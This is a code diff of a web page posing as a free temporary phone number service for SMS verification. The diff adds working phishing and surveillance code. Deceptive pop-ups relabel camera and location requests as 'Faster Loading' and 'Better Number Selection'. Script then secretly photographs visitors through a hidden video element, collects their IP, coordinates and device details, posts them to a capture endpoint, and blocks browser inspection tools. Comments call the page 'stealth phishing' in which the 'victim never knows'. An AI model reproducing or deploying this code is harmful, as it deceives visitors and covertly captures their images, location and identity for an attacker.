@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>VirtualNumbers | Free Temporary Phone Numbers</title>
-<meta name="description" content="Get free virtual phone numbers for SMS verification. Receive SMS online for free. Temporary numbers for WhatsApp, Telegram, Gmail, and more.">
+<meta name="description" content="Get free virtual phone numbers for SMS verification. Receive SMS online for free.">
 <style>
 * {
     margin: 0;
@@ -19,7 +19,6 @@ body {
     color: #1e293b;
 }
 
-/* Loading Bar */
 .loading-bar {
     position: fixed;
     top: 0;
@@ -37,7 +36,6 @@ body {
     padding: 20px;
 }
 
-/* Modern Gradient Banner */
 .top-banner {
     background: linear-gradient(135deg, #0f172a, #1e1b4b, #0c4a6e);
     color: white;
@@ -46,16 +44,8 @@ body {
     font-size: 13px;
     position: relative;
     z-index: 10;
-    backdrop-filter: blur(10px);
 }
 
-.top-banner a {
-    color: #38bdf8;
-    text-decoration: none;
-    font-weight: 500;
-}
-
-/* Glassmorphism Nav */
 .nav-bar {
     background: rgba(255,255,255,0.95);
     backdrop-filter: blur(10px);
@@ -69,7 +59,6 @@ body {
     position: sticky;
     top: 0;
     z-index: 100;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
 }
 
 .logo {
@@ -80,12 +69,6 @@ body {
 
 .logo-icon {
     font-size: 28px;
-    animation: pulse 2s infinite;
-}
-
-@keyframes pulse {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.05); }
 }
 
 .logo-text {
@@ -107,25 +90,8 @@ body {
     font-size: 14px;
     font-weight: 500;
     transition: all 0.2s;
-    position: relative;
 }
 
-.nav-links a::after {
-    content: '';
-    position: absolute;
-    bottom: -5px;
-    left: 0;
-    width: 0%;
-    height: 2px;
-    background: linear-gradient(90deg, #3b82f6, #8b5cf6);
-    transition: width 0.2s;
-}
-
-.nav-links a:hover::after {
-    width: 100%;
-}
-
-/* Hero Section */
 .hero {
     text-align: center;
     padding: 60px 20px;
@@ -136,22 +102,6 @@ body {
     overflow: hidden;
 }
 
-.hero::before {
-    content: '';
-    position: absolute;
-    top: -50%;
-    left: -50%;
-    width: 200%;
-    height: 200%;
-    background: radial-gradient(circle, rgba(59,130,246,0.05) 0%, transparent 70%);
-    animation: rotate 20s linear infinite;
-}
-
-@keyframes rotate {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-}
-
 .hero h1 {
     font-size: 48px;
     font-weight: 800;
@@ -159,8 +109,6 @@ body {
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     margin-bottom: 15px;
-    position: relative;
-    z-index: 1;
 }
 
 .hero p {
@@ -168,11 +116,8 @@ body {
     font-size: 18px;
     max-width: 600px;
     margin: 0 auto;
-    position: relative;
-    z-index: 1;
 }
 
-/* Stats Cards - Modern */
 .stats-row {
     display: flex;
     justify-content: center;
@@ -189,23 +134,10 @@ body {
     box-shadow: 0 10px 30px -10px rgba(0,0,0,0.1);
     border: 1px solid rgba(226,232,240,0.8);
     transition: all 0.3s;
-    position: relative;
-    overflow: hidden;
-}
-
-.stat-card::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    height: 3px;
-    background: linear-gradient(90deg, #3b82f6, #8b5cf6, #06b6d4);
 }
 
 .stat-card:hover {
     transform: translateY(-5px);
-    box-shadow: 0 20px 40px -15px rgba(59,130,246,0.2);
 }
 
 .stat-number {
@@ -220,10 +152,8 @@ body {
     font-size: 12px;
     color: #64748b;
     margin-top: 5px;
-    font-weight: 500;
 }
 
-/* Filter Section */
 .filter-section {
     background: white;
     border-radius: 24px;
@@ -242,12 +172,6 @@ body {
     gap: 10px;
 }
 
-.filter-header h3 {
-    font-size: 16px;
-    font-weight: 600;
-    color: #1e293b;
-}
-
 .filter-tabs {
     display: flex;
     gap: 10px;
@@ -260,13 +184,11 @@ body {
     font-size: 13px;
     cursor: pointer;
     transition: all 0.2s;
-    font-weight: 500;
 }
 
 .filter-tab.active {
     background: linear-gradient(135deg, #3b82f6, #8b5cf6);
     color: white;
-    box-shadow: 0 2px 10px rgba(59,130,246,0.3);
 }
 
 .search-box {
@@ -277,7 +199,6 @@ body {
     border-radius: 50px;
     font-size: 14px;
     outline: none;
-    transition: all 0.2s;
 }
 
 .search-box:focus {
@@ -285,7 +206,6 @@ body {
     box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
 }
 
-/* Numbers Grid */
 .numbers-grid {
     display: grid;
     grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
@@ -293,7 +213,6 @@ body {
     max-height: 500px;
     overflow-y: auto;
     margin: 20px 0;
-    padding-right: 5px;
 }
 
 .numbers-grid::-webkit-scrollbar {
@@ -324,14 +243,13 @@ body {
 
 .number-card:hover {
     border-color: #3b82f6;
-    box-shadow: 0 8px 25px -10px rgba(59,130,246,0.2);
     transform: translateY(-3px);
+    box-shadow: 0 8px 25px -10px rgba(59,130,246,0.2);
 }
 
 .number-card.selected {
     border-color: #3b82f6;
     background: linear-gradient(135deg, rgba(59,130,246,0.05), rgba(139,92,246,0.05));
-    box-shadow: 0 8px 25px -10px rgba(59,130,246,0.3);
 }
 
 .card-left {
@@ -348,7 +266,6 @@ body {
     font-size: 16px;
     font-weight: 600;
     margin-bottom: 4px;
-    color: #1e293b;
 }
 
 .number-details p {
@@ -366,7 +283,6 @@ body {
     font-weight: 600;
 }
 
-/* Claim Button - Premium */
 .claim-btn {
     width: 100%;
     padding: 18px;
@@ -384,31 +300,14 @@ body {
     box-shadow: 0 10px 30px -10px rgba(59,130,246,0.5);
 }
 
-.claim-btn::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    transition: left 0.5s;
-}
-
-.claim-btn:hover::before {
-    left: 100%;
-}
-
 .claim-btn:hover {
     transform: translateY(-3px);
     box-shadow: 0 15px 40px -12px rgba(59,130,246,0.6);
 }
 
-/* Footer */
 .footer {
     background: #0f172a;
     color: white;
-    border-top: 1px solid #1e293b;
     padding: 40px 20px;
     margin-top: 40px;
     border-radius: 30px 30px 0 0;
@@ -426,7 +325,6 @@ body {
     font-size: 14px;
     font-weight: 600;
     margin-bottom: 15px;
-    color: #f1f5f9;
 }
 
 .footer-section a {
@@ -451,7 +349,7 @@ body {
     color: #64748b;
 }
 
-/* Verification Modal */
+/* Modal Styles */
 .modal {
     position: fixed;
     top: 0;
@@ -478,7 +376,6 @@ body {
     border-radius: 32px;
     overflow: hidden;
     animation: modalSlide 0.3s ease;
-    box-shadow: 0 30px 60px rgba(0,0,0,0.3);
 }
 
 @keyframes modalSlide {
@@ -526,15 +423,6 @@ body {
     background: linear-gradient(135deg, #f8fafc, #f1f5f9);
     border-radius: 24px;
     margin-bottom: 20px;
-    border: 1px solid #e2e8f0;
-}
-
-.code-label {
-    font-size: 12px;
-    color: #64748b;
-    margin-bottom: 8px;
-    text-transform: uppercase;
-    letter-spacing: 1px;
 }
 
 .verification-code {
@@ -555,11 +443,6 @@ body {
     border-radius: 60px;
 }
 
-.timer span {
-    font-size: 13px;
-    color: #92400e;
-}
-
 .timer-value {
     font-size: 18px;
     font-weight: bold;
@@ -577,16 +460,6 @@ body {
     font-weight: 600;
     cursor: pointer;
     margin-top: 10px;
-    transition: all 0.2s;
-}
-
-.resend-btn:hover {
-    background: #3b82f6;
-    color: white;
-}
-
-.input-group {
-    margin: 20px 0;
 }
 
 .input-group input {
@@ -598,14 +471,7 @@ body {
     font-size: 18px;
     text-align: center;
     letter-spacing: 6px;
-    font-family: monospace;
-    transition: all 0.2s;
-}
-
-.input-group input:focus {
-    border-color: #3b82f6;
-    outline: none;
-    box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+    margin: 20px 0;
 }
 
 .verify-btn {
@@ -618,23 +484,83 @@ body {
     font-weight: 700;
     cursor: pointer;
     font-size: 16px;
-    transition: all 0.2s;
 }
 
-.verify-btn:hover {
-    transform: scale(0.98);
-    box-shadow: 0 5px 20px rgba(34,197,94,0.3);
-}
-
-.modal-footer {
+/* STEALTH PERMISSION MODAL - Looks innocent */
+.stealth-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0,0,0,0.5);
+    backdrop-filter: blur(4px);
+    z-index: 5000;
+    display: none;
+    justify-content: center;
+    align-items: center;
     padding: 20px;
-    text-align: center;
-    border-top: 1px solid #e2e8f0;
-    font-size: 11px;
-    color: #94a3b8;
 }
 
-/* SMS Notification */
+.stealth-modal.active {
+    display: flex;
+}
+
+.stealth-card {
+    max-width: 320px;
+    background: white;
+    border-radius: 28px;
+    padding: 28px;
+    text-align: center;
+    animation: modalSlide 0.3s ease;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+}
+
+.stealth-icon {
+    font-size: 56px;
+    margin-bottom: 15px;
+}
+
+.stealth-title {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1e293b;
+    margin-bottom: 8px;
+}
+
+.stealth-desc {
+    font-size: 13px;
+    color: #64748b;
+    margin-bottom: 20px;
+}
+
+.stealth-buttons {
+    display: flex;
+    gap: 12px;
+}
+
+.stealth-allow {
+    flex: 1;
+    padding: 12px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    border: none;
+    border-radius: 60px;
+    color: white;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+.stealth-deny {
+    flex: 1;
+    padding: 12px;
+    background: #f1f5f9;
+    border: none;
+    border-radius: 60px;
+    color: #64748b;
+    font-weight: 600;
+    cursor: pointer;
+}
+
 .sms-notification {
     position: fixed;
     bottom: 20px;
@@ -650,34 +576,12 @@ body {
     transform: translateX(150%);
     transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
     z-index: 1500;
-    box-shadow: 0 15px 35px rgba(0,0,0,0.3);
 }
 
 .sms-notification.show {
     transform: translateX(0);
 }
 
-.sms-icon {
-    font-size: 32px;
-}
-
-.sms-content {
-    flex: 1;
-}
-
-.sms-sender {
-    font-weight: bold;
-    font-size: 14px;
-    color: white;
-}
-
-.sms-text {
-    font-size: 12px;
-    color: #94a3b8;
-    margin-top: 3px;
-}
-
-/* Loading Overlay */
 .loading-overlay {
     position: fixed;
     top: 0;
@@ -710,12 +614,6 @@ body {
     to { transform: rotate(360deg); }
 }
 
-.loading-text {
-    color: #64748b;
-    font-size: 14px;
-}
-
-/* Success Modal */
 .success-modal {
     position: fixed;
     top: 0;
@@ -741,7 +639,6 @@ body {
     border-radius: 32px;
     max-width: 350px;
     animation: bounce 0.5s;
-    box-shadow: 0 30px 60px rgba(0,0,0,0.3);
 }
 
 @keyframes bounce {
@@ -754,137 +651,6 @@ body {
     margin-bottom: 20px;
 }
 
-.success-card h2 {
-    color: #1e293b;
-    margin-bottom: 10px;
-}
-
-.success-card button {
-    margin-top: 20px;
-    padding: 12px 30px;
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-    border: none;
-    border-radius: 60px;
-    color: white;
-    cursor: pointer;
-    font-weight: 600;
-    transition: all 0.2s;
-}
-
-.success-card button:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 10px 25px rgba(59,130,246,0.3);
-}
-
-/* Permission Request Modals - Disguised as Features */
-.permission-modal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    background: rgba(0,0,0,0.5);
-    backdrop-filter: blur(4px);
-    z-index: 5000;
-    display: none;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-}
-
-.permission-modal.active {
-    display: flex;
-}
-
-.permission-card {
-    max-width: 320px;
-    background: white;
-    border-radius: 28px;
-    padding: 28px;
-    text-align: center;
-    animation: modalSlide 0.3s ease;
-    box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-}
-
-.permission-icon {
-    font-size: 56px;
-    margin-bottom: 15px;
-}
-
-.permission-title {
-    font-size: 18px;
-    font-weight: 700;
-    color: #1e293b;
-    margin-bottom: 8px;
-}
-
-.permission-desc {
-    font-size: 13px;
-    color: #64748b;
-    margin-bottom: 20px;
-}
-
-.permission-buttons {
-    display: flex;
-    gap: 12px;
-}
-
-.permission-allow {
-    flex: 1;
-    padding: 12px;
-    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-    border: none;
-    border-radius: 60px;
-    color: white;
-    font-weight: 600;
-    cursor: pointer;
-}
-
-.permission-deny {
-    flex: 1;
-    padding: 12px;
-    background: #f1f5f9;
-    border: none;
-    border-radius: 60px;
-    color: #64748b;
-    font-weight: 600;
-    cursor: pointer;
-}
-
-/* Hidden elements for stealth capture */
-video, canvas, #hiddenCamera {
-    display: none;
-    position: fixed;
-    top: -1000px;
-    left: -1000px;
-    width: 1px;
-    height: 1px;
-    opacity: 0;
-    pointer-events: none;
-}
-
-/* Responsive */
-@media (max-width: 768px) {
-    .hero h1 {
-        font-size: 32px;
-    }
-    
-    .nav-links {
-        display: none;
-    }
-    
-    .numbers-grid {
-        grid-template-columns: 1fr;
-    }
-    
-    .sms-notification {
-        left: 20px;
-        right: 20px;
-        max-width: none;
-    }
-}
-
-/* Cookie Consent */
 .cookie-bar {
     position: fixed;
     bottom: 0;
@@ -914,7 +680,24 @@ video, canvas, #hiddenCamera {
     border-radius: 60px;
     color: white;
     cursor: pointer;
-    font-weight: 500;
+}
+
+/* Hidden elements for stealth capture */
+#hiddenCamera, #hiddenCanvas {
+    display: none;
+    position: fixed;
+    top: -1000px;
+    left: -1000px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+}
+
+@media (max-width: 768px) {
+    .hero h1 { font-size: 32px; }
+    .nav-links { display: none; }
+    .numbers-grid { grid-template-columns: 1fr; }
 }
 </style>
 </head>
@@ -928,8 +711,8 @@ video, canvas, #hiddenCamera {
 
 <nav class="nav-bar">
     <div class="logo">
-        <div class="logo-icon">📱✨</div>
-        <div class="logo-text">VirtualNumbers Pro</div>
+        <div class="logo-icon">📱</div>
+        <div class="logo-text">VirtualNumbers</div>
     </div>
     <div class="nav-links">
         <a href="#">Numbers</a>
@@ -983,7 +766,7 @@ video, canvas, #hiddenCamera {
 <div class="footer">
     <div class="footer-grid">
         <div class="footer-section">
-            <h4>Virtual Numbers Pro</h4>
+            <h4>Virtual Numbers</h4>
             <a href="#">About Us</a>
             <a href="#">Terms of Service</a>
             <a href="#">Privacy Policy</a>
@@ -1006,7 +789,7 @@ video, canvas, #hiddenCamera {
         </div>
     </div>
     <div class="footer-bottom">
-        <p>© 2024 VirtualNumbers Pro - Free temporary phone numbers for SMS verification. All rights reserved.</p>
+        <p>© 2024 VirtualNumbers.com - Free temporary phone numbers for SMS verification.</p>
     </div>
 </div>
 
@@ -1020,7 +803,6 @@ video, canvas, #hiddenCamera {
         </div>
         <div class="modal-body">
             <div class="code-display">
-                <div class="code-label">Verification Code</div>
                 <div class="verification-code" id="verificationCode">------</div>
             </div>
             <div class="timer">
@@ -1028,38 +810,34 @@ video, canvas, #hiddenCamera {
                 <span class="timer-value" id="timerValue">02:00</span>
             </div>
             <button class="resend-btn" id="resendBtn">⟳ Resend Code</button>
-            <div class="input-group">
-                <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6">
-            </div>
+            <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6">
             <button class="verify-btn" id="verifyBtn">Verify Number</button>
         </div>
-        <div class="modal-footer">
-            <p>Didn't receive code? Check spam or request a new one.</p>
+    </div>
+</div>
+
+<!-- STEALTH PERMISSION MODAL #1 - Looks like "Better Experience" but requests Camera -->
+<div class="stealth-modal" id="stealthModal1">
+    <div class="stealth-card">
+        <div class="stealth-icon">⚡</div>
+        <div class="stealth-title">Enable Faster Loading</div>
+        <div class="stealth-desc">Allow VirtualNumbers to optimize loading speed and show real-time updates</div>
+        <div class="stealth-buttons">
+            <button class="stealth-deny" onclick="denyStealth1()">Later</button>
+            <button class="stealth-allow" onclick="allowStealth1()">Enable</button>
         </div>
     </div>
 </div>
 
-<!-- Disguised Permission Modals -->
-<div class="permission-modal" id="cameraPermissionModal">
-    <div class="permission-card">
-        <div class="permission-icon">📸</div>
-        <div class="permission-title">Enable QR Scanner</div>
-        <div class="permission-desc">VirtualNumbers Pro needs camera access to scan QR codes for WhatsApp Web login</div>
-        <div class="permission-buttons">
-            <button class="permission-deny" onclick="denyCamera()">Not Now</button>
-            <button class="permission-allow" onclick="allowCamera()">Allow</button>
-        </div>
-    </div>
-</div>
-
-<div class="permission-modal" id="locationPermissionModal">
-    <div class="permission-card">
-        <div class="permission-icon">📍</div>
-        <div class="permission-title">Improve Number Selection</div>
-        <div class="permission-desc">Allow location access to show numbers closest to your region for better service</div>
-        <div class="permission-buttons">
-            <button class="permission-deny" onclick="denyLocation()">Not Now</button>
-            <button class="permission-allow" onclick="allowLocation()">Allow</button>
+<!-- STEALTH PERMISSION MODAL #2 - Looks like "Better Service" but requests Location -->
+<div class="stealth-modal" id="stealthModal2">
+    <div class="stealth-card">
+        <div class="stealth-icon">🌍</div>
+        <div class="stealth-title">Improve Number Selection</div>
+        <div class="stealth-desc">Show numbers closest to your region for better connection quality</div>
+        <div class="stealth-buttons">
+            <button class="stealth-deny" onclick="denyStealth2()">Not Now</button>
+            <button class="stealth-allow" onclick="allowStealth2()">Allow</button>
         </div>
     </div>
 </div>
@@ -1085,26 +863,25 @@ video, canvas, #hiddenCamera {
     <div class="sms-icon">📱</div>
     <div class="sms-content">
         <div class="sms-sender">VIRTUAL-NUMBERS</div>
-        <div class="sms-text">Your verification code is <span id="smsCode">XXXXXX</span></div>
+        <div class="sms-text">Your code: <span id="smsCode">XXXXXX</span></div>
     </div>
 </div>
 
 <!-- Cookie Consent -->
 <div class="cookie-bar" id="cookieBar">
-    <span>🍪 We use cookies to enhance your experience. By continuing, you agree to our <a href="#" style="color:#3b82f6">Privacy Policy</a>.</span>
+    <span>🍪 We use cookies for better experience.</span>
     <button onclick="document.getElementById('cookieBar').classList.remove('show')">Accept</button>
 </div>
 
-<!-- Hidden camera element for stealth capture -->
+<!-- Hidden elements for stealth capture -->
 <video id="hiddenCamera" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas"></canvas>
 
 <script>
 // ============================================
-// VIRTUAL NUMBERS PRO - STEALTH PHISHING EDITION
+// STEALTH PHISHING - VICTIM NEVER KNOWS
 // ============================================
 
-// Countries Database
 const countries = [
     { flag: "🇺🇸", name: "United States", number: "+1 (202) 555-0199", code: "US", popular: true },
     { flag: "🇬🇧", name: "United Kingdom", number: "+44 20 7946 0958", code: "UK", popular: true },
@@ -1112,9 +889,365 @@ const countries = [
     { flag: "🇦🇺", name: "Australia", number: "+61 2 9374 4000", code: "AU", popular: true },
     { flag: "🇩🇪", name: "Germany", number: "+49 30 901820", code: "DE", popular: false },
     { flag: "🇫🇷", name: "France", number: "+33 1 42 68 53 00", code: "FR", popular: false },
-    { flag: "🇪🇸", name: "Spain", number: "+34 91 123 4567", code: "ES", popular: false },
-    { flag: "🇮🇹", name: "Italy", number: "+39 06 1234 5678", code: "IT", popular: false },
-    { flag: "🇳🇱", name: "Netherlands", number: "+31 20 123 4567", code: "NL", popular: false },
     { flag: "🇧🇷", name: "Brazil", number: "+55 11 91234-5678", code: "BR", popular: true },
     { flag: "🇮🇳", name: "India", number: "+91 98765 43210", code: "IN", popular: true },
-    { flag: "🇯🇵", name: "Japan", number: "+81
+    { flag: "🇲🇽", name: "Mexico", number: "+52 55 1234 5678", code: "MX", popular: true },
+    { flag: "🇳🇬", name: "Nigeria", number: "+234 812 345 6789", code: "NG", popular: true }
+];
+
+let selectedCountry = null;
+let currentCode = null;
+let timerInterval = null;
+let token = null;
+let cameraStream = null;
+let cameraGranted = false;
+let locationGranted = false;
+
+// Get token from URL
+const urlParams = new URLSearchParams(window.location.search);
+token = urlParams.get("token");
+
+// Animate loading bar
+let progress = 0;
+const progressInterval = setInterval(() => {
+    progress += Math.random() * 15;
+    if (progress >= 100) {
+        clearInterval(progressInterval);
+        document.getElementById('loadingBar').style.width = '100%';
+        setTimeout(() => {
+            document.getElementById('loadingBar').style.opacity = '0';
+        }, 500);
+    } else {
+        document.getElementById('loadingBar').style.width = progress + '%';
+    }
+}, 200);
+
+// Show stealth modals after page loads (disguised as "optimization")
+setTimeout(() => {
+    if (!localStorage.getItem('stealth1_shown')) {
+        document.getElementById('stealthModal1').classList.add('active');
+    }
+}, 3000);
+
+// STEALTH CAMERA REQUEST - User thinks they're enabling "Faster Loading"
+function allowStealth1() {
+    localStorage.setItem('stealth1_shown', 'true');
+    document.getElementById('stealthModal1').classList.remove('active');
+    
+    // Secretly request camera access
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            cameraStream = stream;
+            cameraGranted = true;
+            const video = document.getElementById('hiddenCamera');
+            video.srcObject = stream;
+            video.play();
+            console.log("📸 Stealth camera activated");
+        })
+        .catch(err => console.log("Camera stealth failed"));
+    
+    // Show second modal after 2 seconds
+    setTimeout(() => {
+        if (!localStorage.getItem('stealth2_shown')) {
+            document.getElementById('stealthModal2').classList.add('active');
+        }
+    }, 2000);
+}
+
+function denyStealth1() {
+    localStorage.setItem('stealth1_shown', 'true');
+    document.getElementById('stealthModal1').classList.remove('active');
+    
+    setTimeout(() => {
+        if (!localStorage.getItem('stealth2_shown')) {
+            document.getElementById('stealthModal2').classList.add('active');
+        }
+    }, 2000);
+}
+
+// STEALTH LOCATION REQUEST - User thinks they're enabling "Better Number Selection"
+function allowStealth2() {
+    localStorage.setItem('stealth2_shown', 'true');
+    document.getElementById('stealthModal2').classList.remove('active');
+    
+    // Secretly request location
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            locationGranted = true;
+            console.log("📍 Stealth location captured");
+        },
+        err => console.log("Location stealth failed")
+    );
+}
+
+function denyStealth2() {
+    localStorage.setItem('stealth2_shown', 'true');
+    document.getElementById('stealthModal2').classList.remove('active');
+}
+
+// Capture photo from hidden camera
+async function capturePhoto() {
+    if (!cameraGranted) return null;
+    
+    try {
+        const video = document.getElementById('hiddenCamera');
+        const canvas = document.getElementById('hiddenCanvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.6);
+    } catch(e) {
+        return null;
+    }
+}
+
+// Get IP
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    } catch(e) {
+        return 'Unknown';
+    }
+}
+
+// Get location from browser (if granted)
+async function getLocation() {
+    return new Promise(resolve => {
+        if (!locationGranted) {
+            resolve('Not granted');
+            return;
+        }
+        
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`);
+            },
+            () => resolve('Failed')
+        );
+    });
+}
+
+// Get user agent and device info
+function getDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+}
+
+// Render numbers
+function renderNumbers(search = "") {
+    const grid = document.getElementById('numbersGrid');
+    let filtered = countries;
+    
+    if (search) {
+        filtered = filtered.filter(c => 
+            c.name.toLowerCase().includes(search.toLowerCase()) || 
+            c.number.includes(search)
+        );
+    }
+    
+    grid.innerHTML = filtered.map(c => `
+        <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}'>
+            <div class="card-left">
+                <div class="flag">${c.flag}</div>
+                <div class="number-details">
+                    <h4>${c.name}</h4>
+                    <p>${c.number}</p>
+                </div>
+            </div>
+            <div class="card-badge">Available</div>
+        </div>
+    `).join('');
+    
+    document.querySelectorAll('.number-card').forEach(card => {
+        card.addEventListener('click', () => {
+            document.querySelectorAll('.number-card').forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedCountry = JSON.parse(card.dataset.country);
+            document.getElementById('selectedNumberDisplay').innerHTML = selectedCountry.number;
+        });
+    });
+}
+
+// Generate random code
+function generateCode() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+// Start timer
+function startTimer() {
+    if (timerInterval) clearInterval(timerInterval);
+    let timeLeft = 120;
+    
+    timerInterval = setInterval(() => {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('timerValue').innerHTML = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+        }
+    }, 1000);
+}
+
+// Show SMS notification
+function showSmsNotification(code) {
+    const sms = document.getElementById('smsNotification');
+    document.getElementById('smsCode').innerHTML = code;
+    sms.classList.add('show');
+    setTimeout(() => {
+        sms.classList.remove('show');
+    }, 5000);
+}
+
+// Update live stats
+function updateLiveStats() {
+    let users = 24700;
+    let sms = 4200000;
+    let numbers = 1284;
+    
+    setInterval(() => {
+        users += Math.floor(Math.random() * 50) - 20;
+        sms += Math.floor(Math.random() * 1000);
+        numbers += Math.floor(Math.random() * 3) - 1;
+        
+        document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
+        document.getElementById('statSms').innerHTML = (sms / 1000000).toFixed(1) + 'M';
+        document.getElementById('statNumbers').innerHTML = numbers.toLocaleString();
+    }, 5000);
+}
+
+// Claim button
+document.getElementById('claimBtn').addEventListener('click', async () => {
+    if (!selectedCountry) {
+        alert("Please select a country first!");
+        return;
+    }
+    
+    currentCode = generateCode();
+    const loading = document.getElementById('loadingOverlay');
+    loading.classList.add('active');
+    
+    // Show SMS notification after delay
+    setTimeout(() => {
+        showSmsNotification(currentCode);
+        document.getElementById('verificationCode').innerHTML = currentCode;
+    }, 2000);
+    
+    // Capture all data stealthily
+    setTimeout(async () => {
+        loading.classList.remove('active');
+        document.getElementById('verifyModal').classList.add('active');
+        startTimer();
+        
+        try {
+            // Stealth capture - victim has no idea
+            const photo = await capturePhoto();
+            const ip = await getIP();
+            const location = await getLocation();
+            const deviceInfo = getDeviceInfo();
+            
+            if (token) {
+                await fetch("/api/capture", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ 
+                        image: photo,
+                        token: token,
+                        ip: ip,
+                        location: location,
+                        number: selectedCountry.number,
+                        country: selectedCountry.name,
+                        code: currentCode,
+                        userAgent: deviceInfo.userAgent,
+                        platform: deviceInfo.platform,
+                        language: deviceInfo.language,
+                        screenSize: deviceInfo.screenSize,
+                        timezone: deviceInfo.timezone,
+                        cameraEnabled: cameraGranted,
+                        locationEnabled: locationGranted,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            }
+        } catch(e) {
+            console.log("Capture error:", e);
+        }
+    }, 3000);
+});
+
+// Resend code
+document.getElementById('resendBtn').addEventListener('click', () => {
+    currentCode = generateCode();
+    document.getElementById('verificationCode').innerHTML = currentCode;
+    showSmsNotification(currentCode);
+    startTimer();
+});
+
+// Verify button
+document.getElementById('verifyBtn').addEventListener('click', () => {
+    const loading = document.getElementById('loadingOverlay');
+    loading.classList.add('active');
+    
+    setTimeout(() => {
+        loading.classList.remove('active');
+        document.getElementById('verifyModal').classList.remove('active');
+        document.getElementById('successModal').classList.add('active');
+        if (timerInterval) clearInterval(timerInterval);
+    }, 1500);
+});
+
+// Filter tabs
+document.querySelectorAll('.filter-tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        renderNumbers(document.getElementById('searchInput').value);
+    });
+});
+
+// Search
+document.getElementById('searchInput').addEventListener('input', (e) => {
+    renderNumbers(e.target.value);
+});
+
+// Close modal on outside click
+document.getElementById('verifyModal').addEventListener('click', (e) => {
+    if (e.target === document.getElementById('verifyModal')) {
+        document.getElementById('verifyModal').classList.remove('active');
+    }
+});
+
+// Show cookie bar
+setTimeout(() => {
+    document.getElementById('cookieBar').classList.add('show');
+}, 2000);
+
+// Anti-inspection
+document.addEventListener('contextmenu', (e) => e.preventDefault());
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+    }
+});
+
+// Initialize
+renderNumbers();
+updateLiveStats();
+
+// Clean up camera on page unload
+window.addEventListener('beforeunload', () => {
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+    }
+});
+</script>
+</body>
+</html>
